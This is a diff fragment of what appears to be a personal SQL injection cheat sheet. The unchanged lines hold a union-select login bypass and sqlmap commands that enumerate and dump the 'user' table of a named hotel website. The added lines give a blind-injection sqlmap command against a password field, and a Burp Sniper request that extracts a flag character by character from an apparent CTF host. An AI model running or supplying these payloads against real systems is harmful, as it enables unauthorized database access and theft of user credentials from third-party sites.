@@ -113,6 +113,8 @@ username=a' and 1=2 union select 1,1,1,1,1,1,1,1 -- -# &password=1
 sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --tables -D information_schema
 sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --columns -D Sql436940_3 -T user
 sqlmap -u "https://www.hotelelsalvador.net/en/hotel-offer.php?&id=9" --dump -D Sql436940_3 -T user
+Blind SQl 
+sqlmap -u https://xxx.com//Default.aspx/verify --data "{\"ghi_nho\":false,\"mat_khau\":\"abc\",\"ten_dang_nhap\":\"e\"}" --random-agent -p mat_khau
 Sniper
 GET /e5f3efcceb11226e71a6bc5317cf0df6/?password=admin%27%20having%20(substr(flag,6,1))%20=%20%27§§%27%20%20--%20- HTTP/1.1
 Host: web.challenges.pwnerrank.com
